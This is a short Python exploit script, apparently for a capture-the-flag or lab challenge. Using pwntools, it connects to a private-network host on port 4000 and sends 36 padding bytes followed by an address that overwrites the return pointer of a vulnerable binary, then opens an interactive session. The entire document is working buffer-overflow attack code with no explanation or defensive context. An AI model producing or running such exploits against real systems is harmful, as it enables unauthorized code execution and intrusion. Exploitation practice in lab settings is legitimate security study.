import pwn

def exploit():
    conn = pwn.remote("172.19.2.137",4000)
    while conn.can_recv(timeout=1):
        rec = conn.recvline()
        conn.sendlineafter(">>> ",'A'*36 +'\x76\x06\x40\x00\x00\x00\x00\x00')
        conn.interactive()

exploit()